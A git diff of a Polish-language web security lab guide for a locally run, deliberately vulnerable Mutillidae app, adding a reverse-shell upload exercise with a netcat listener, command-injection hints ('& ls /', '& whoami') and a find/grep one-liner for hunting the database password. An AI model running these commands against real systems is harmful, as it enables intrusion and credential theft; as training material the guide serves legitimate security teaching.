@@ -17,6 +17,7 @@ Link do GitHub'a:
 1. Lab3: Insecure Direct Object Reference (IDOR)
 
 ### Instalacja maszyny
+Wersja: 2.8.59
 ```bash
 git clone https://github.com/webpwnized/mutillidae-docker
 cd mutillidae-docker
@@ -31,6 +32,12 @@ Jeśli wystąpią problemy:
 1. Jeśli pojawia się błąd, że adres jest już _"zbindowany"_ `sudo service apache2 stop`
 
 Kod źródłowy każdej strony możesz podejrzeć na `http://127.0.0.1/index.php?page=source-viewer.php`
+
+### Opcja 2 - TYLKO JEŚLI NIE DZIAŁA PIERWSZA
+Wersja: 2.6.52 
+1. `docker pull bltsec/mutillidae-docker`
+1. `docker run -d -p 80:80 -p 443:443 --name owasp17 bltsec/mutillidae-docker`
+1. Przejdź do `localhost/mutillidae`
 
 ### Lab 0 Przykład pracy z ASVS
 1. Sprawdź czy możesz stworzyć użytkownika, którego hasło posiada mniej niż 12 znaków.  
@@ -130,7 +137,20 @@ Podpowiedź: Zobacz jak działa metoda `innerHTML`
 
 ### Lab 4 - Reverse shell
 Sprawdzanie tego co widać to nie wszystko. Jednym z ciekawszych elementów, które można sprawdzać to połączenia TCP/UPD na niefiltrowanych portach.
+#### Sposób 1 
+1. Udaj się na stronę `http://localhost/index.php?page=upload-file.php`
+1. Przygotuj skrypt w PHP i zapisz w lokalnym folderze. Podmień adres IP na swój i zapamiętaj port.
+1. W pierwszym terminalu ustaw nasłuchiwanie na wybranym porcie np. `nc -lvnp 1337`. Adres IP ustaw na swój. (Żeby sprawdzić swoje ip wpisz w terminalu `ipconfig -a`)
+1. Zapisz skrypt i wrzuć go na stronę do upload'u.
+1. Pojawi się informacja w jakiej lokalizacji zostało to umieszczone.
+![Upload reverse shell](assets/z5.png)
+1. Nawiguj do `http://localhost/index.php?page=/tmp/<nazwa_twojego_pliku>.php`
+1. W momencie wejścia na stronę wywołuje się skrypt a w terminalu powinniśmy mieć aktywne połączenie.
+![Reverse Shell 1](assets/z6.png)
 
+
+
+#### Sposób 2
 1. Upewnij się, że aplikacja ciągle działa w tle.
 1. Na jednym terminalu ustaw nasłuchiwanie na dowolnym niefiltrowanym porcie (np. 1337)
 1. Na drugim terminalu wpisz poniższą komendę:
@@ -145,21 +165,23 @@ Sprawdzanie tego co widać to nie wszystko. Jednym z ciekawszych elementów, kt�
 ### Lab 4 - Dodatkowe
 Ta część laboratorium jest przeznaczona na własny rekonesans. Wcześniejsze przykłady były podane w wąskim zakresie dlatego teraz pora na rozwinięcie skrzydeł. Przetestuj aplikację we własnym zakresie - z tym co wiesz lub chcesz poznać. Propozycja: skorzystaj z podanych list i testuj wszystko po kolei. 
 
-Jeśli testując elementy aplikacji uznasz atak siłowy za potrzebny to skorzystaj z payload'ów z tego repozytorium:  
-
-[github.com/swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
+Jeśli testując elementy aplikacji uznasz atak siłowy za potrzebny to skorzystaj z payload'ów z tego repozytorium: [github.com/swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
 
 1. Niektóre podatności (np. XSS) występują na innych stronach. Postaraj się je odszukać.
 1. Znajdź inne podatności np. na stronie logowania (`SQL injection`)
 1. Na stronie `http://127.0.0.1/index.php?page=dns-lookup.php` możesz podejrzeć strukturę katalogów wykorzystując polecenie `ls`. Sprawdź czym musisz je poprzedzić, żeby zadziałało.
 <details>
 <summary>Podpowiedź(rozwiń)</summary>
-<p>
 1. Wpisz <code>& ls /</code>. Możesz dokładnie podejrzeć strukturę plików. Możesz też wpisać <code>& whoami</code> lub <code>& id</code>w celu sprawdzenia jakim użytkownikiem (oraz z jakimi uprawnieniami) jesteś.  
-![Reverse shell](assets/z4.png) 
-</p>
 </details>
 
+![Injection](assets/z4.png) 
 
-<!-- # Tabela raportu
-1. W ramach ćwiczeń uczestnicy opiszą sposób wywołania, działania i potencjalnego załatania podatności. -->
+1. Na tej samej stronie spróbuj znaleźć hasło do bazy danych. Pierwsza opcja to rekonesans (Nie trzeba głęboko szukać).
+<details>
+<summary>Podpowiedź do drugiego sposobu (rozwiń)</summary>
+<code>&find /var/www/mutillidae -name "*.php" | xargs egrep -i "password" | grep "="</code>
+</details>
+## Źrodła 
+1. https://www.computersecuritystudent.com/SECURITY_TOOLS/MUTILLIDAE/MUTILLIDAE_2511/lesson10/index.html
+1. https://github.com/21y4d/blindSQLi/blob/master/blindSQLi.py
